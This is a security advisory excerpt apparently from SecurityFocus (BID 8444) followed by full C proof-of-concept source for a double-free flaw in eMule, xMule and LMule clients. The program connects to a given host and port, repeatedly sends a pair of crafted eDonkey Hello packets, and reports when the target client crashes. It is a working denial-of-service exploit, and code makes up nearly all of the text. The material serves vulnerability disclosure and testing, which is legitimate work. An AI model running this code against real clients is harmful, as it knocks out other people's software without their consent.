source: http://www.securityfocus.com/bid/8444/info

eMule client has been reported prone to a double free vulnerability. It has been reported that when the eMule client receives a specific sequence of packets from a malicious server, a memory object is freed from reserved memory. Under some circumstances the same object may be freed again at a later event, which may ultimately allow an attacker to exploit this condition to execute arbitrary supplied instructions in the context of the vulnerable eMule application. Failed exploitation attempts will result in a denial of service of the affected client. 

/*
 * eMule/xMule/LMule AttachToAlreadyKnown() Object Destruction Vulnerability
 * (SecurityFocus BID 8444)
 * proof of concept code
 * version 1.2 (Sep 01 2003)
 *
 * by R�mi Denis-Courmont <exploit@simutrans.fr.st>
 *   http://www.simphalempin.com/dev/
 *
 * This vulnerability was found by:
 *   Stefan Esser <s.esser@e-matters.de>
 * whose original advisory may be fetched from:
 *   http://security.e-matters.de/advisories/022003.html
 *
 * Vulnerable:
 *  - eMule v0.29b/0.29c -> client crashes after **A LOT** of DoS attempts
 *  - eMule v0.29a -> client crashes after a few DoS attempts
 *  - xMule stable v1.4.2 -> client crashes immediately
 *  - xMule unstable v1.5.6a -> client crashes immediately
 *  - Lmule v1.3.1 -> ??? (NOT tested)
 *
 * Not vulnerable:
 *  - xMule stable v1.4.3 and v1.6.0,
 *  - eMule v0.30a.
 */


/*****************************************************************************
 * Copyright (C) 2003  R�mi Denis-Courmont.  All rights reserved.            *
 *                                                                           *
 * Redistribution and use in source and binary forms, with or without        *
 * modification, are permitted provided that the following conditions        *
 * are met:                                                                  *
 * 1. Redistributions of source code must retain the above copyright         *
 *    notice, this list of conditions and the following disclaimer.          *
 * 2. Redistributions in binary form must reproduce the above copyright      *
 *    notice, this list of conditions and the following disclaimer in the    *
 *    documentation and/or other materials provided with the distribution.   *
 *                                                                           *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR      *
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES *
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.   *
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,          *
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT  *
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, *
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY     *
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT       *
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF  *
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.         *
 *****************************************************************************/

#include <stdio.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netdb.h>

#define USER_HASH	"AToAK__DoS__vuln" /* 16 bytes */
#define MAXTRIES	5000

int gai_errno = 0;

void
gai_perror (const char *str)
{
	if ((gai_errno == EAI_SYSTEM) || (gai_errno == 0))
		perror (str);
	else
		fprintf (stderr, "%s: %s\n", str, gai_strerror (gai_errno));
}


int
socket_connect (const char *hostname, const char *servname)
{
	struct addrinfo hints, *res;

	hints.ai_family = PF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = 0;
	hints.ai_flags = 0;

	if ((gai_errno = getaddrinfo (hostname, servname, &hints, &res)) == 0)
	{
		struct addrinfo *ptr;

		for (ptr = res; ptr != NULL; ptr = ptr->ai_next)
		{
			int sock;

			sock = socket (ptr->ai_family, ptr->ai_socktype,
					ptr->ai_protocol);
			if (sock != -1)
			{
				const int val = 1;

				setsockopt (sock, SOL_SOCKET, SO_REUSEADDR,
						&val, sizeof (val));
				if (connect (sock, ptr->ai_addr,
						ptr->ai_addrlen))
					close (sock);
				else
				{
					/* success! */
					freeaddrinfo (res);
					return sock;
				}
			}
		}
		freeaddrinfo (res);
	}
	return -1;
}


int
send_2hello (int fd/*, const void *userhash, size_t hlen*/)
{
	/*
	 * Note that eDonkey is an Intel-centric protocol that sends/receives
	 * everything in counter-network-byte order (ie. low order first).
	 */
	uint8_t buf[] =
		/* FIRST Hello request */
		"\xE3" // protocol
		"\x22\x00\x00\x00" // packet size
		"\x01" // command (Hello)
		"\x10" // user hash size
		USER_HASH // user hash
		"\x01\x00\x00\xff" // user ID = our IP
		"\x36\x12" // port on which to connect to us
		"\x00\x00\x00\x00" // tag count (MUST be <= 7)
		/* no tag for now */
		"\x00\x00\x00\x00" // server IP (0 = none)
		"\x00\x00" // server port (0 = none, usually 0x1235)

		/* SECOND Hello request */
		"\xE3" // protocol
		"\x22\x00\x00\x00" // packet size
		"\x01" // command (Hello)
		"\x10" // user hash size
		USER_HASH // user hash
		"\x01\x00\x00\xff" // user ID = our IP
		"\x36\x12" // port on which to connect to us
		"\x00\x00\x00\x00" // tag count (MUST be <= 7)
		/* no tag for now */
		"\x00\x00\x00\x00" // server IP (0 = none)
		"\x00\x00" // server port (0 = none, usually 0x1235)
		;
	/*
	 * We should put our real IP, randomize our user hash and add some tag
	 * like real P2P clients here
	 */
	return (send (fd, buf, sizeof (buf) - 1, 0) != (sizeof (buf) - 1));
}


int
recv_hello (int fd)
{
	unsigned char buf[256];
	uint8_t proto, cmd;
	uint32_t plen;

	return
	(recv (fd, &proto, sizeof (proto), MSG_WAITALL) != sizeof (proto))
	 || (proto != 0xE3)
	 || (recv (fd, &plen, sizeof (plen), MSG_WAITALL) != sizeof (plen))
	 || (plen < 33) || (--plen > sizeof (buf))
	 || (recv (fd, &cmd, sizeof (cmd), MSG_WAITALL) != sizeof (cmd))
	 || (cmd != 0x4C);
}


static int
usage (const char *path)
{
	printf (
"Syntax: %s <hostname|IP> [port]\n"
"        Attempt to crash eMule/xMule/LMule client <hostname|IP>\n"
"        ([port] is 4662 by default) through the\n"
"        \"AttachToAlreadyKnown Object Destruction vulnerability\"\n"
"        found by Stefan Esser <s.esser (at) e-matters (dot) de>.\n", path);
	return 2;
}


int
main (int argc, char *argv[])
{
	puts ("eMule/xMule/LMule AttachToAlreadyKnown() "
			"Object Destruction vulnerability\n"
		"proof of concept code\n"
		"Copyright (C) 2003 R�mi Denis-Courmont "
			"<exploit@simutrans.fr.st>\n");
	if (argc < 2)
		return usage (argv[0]);
	else
	{
		int fd, count = 0;
		const char *host, *port;

		host = argv[1];
		port = (argc < 3) ? "4662" : argv[2];
		printf ("Connecting to [%s]:%s ...\n", host, port);
		while (++count && ((fd = socket_connect (host, port)) != -1))
		{
			printf ("Sending double-Hello packet (%d)...\n",
					count);
			if (send_2hello (fd))
			{
				perror ("Error");
				count = -1;
			}

			puts ("Checking reply ...");
			if (recv_hello (fd))
			{
				fprintf (stderr, "%s: malformed reply\n",
						host);
				count = -1;
			}
			else if (recv_hello (fd))
				printf ("%s might be vulnerable.\n", host);
			else
			{
				printf ("%s is not vulnerable.\n", host);
				count = -1;
			}
			close (fd);

			if (count >= MAXTRIES)
			{
				printf ("%s is still alive after %d deadly "
					"packets. Probably not vulnerable.\n",
					host, count);
				return 0;
			}
		}

		gai_perror (host);
		if (count)
		{
			puts ("Remote host seems to have crashed!");
			return 0;
		}
	}

	return 1;
}
